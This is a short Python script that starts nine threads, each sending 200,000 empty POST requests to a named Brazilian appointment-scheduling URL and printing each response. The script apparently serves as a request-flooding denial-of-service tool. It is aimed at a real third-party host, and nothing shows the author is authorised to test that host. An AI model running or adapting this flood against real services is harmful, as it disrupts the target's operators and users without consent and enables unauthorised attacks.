import requests
import threading
import time

def test():
  i = 0
  for i in range(200000):
    serasa_auth = requests.post(
      'http://sistemas.oclif.com.br/agendamento/', 
    )
    print('{}:{}'.format(i, serasa_auth))

a = threading.Thread(target=test)
b = threading.Thread(target=test)
c = threading.Thread(target=test)
d = threading.Thread(target=test)
e = threading.Thread(target=test)
f = threading.Thread(target=test)
h = threading.Thread(target=test)
i = threading.Thread(target=test)
j = threading.Thread(target=test)

a.start()
b.start()
c.start()
d.start()
e.start()
f.start()
h.start()
i.start()
j.start()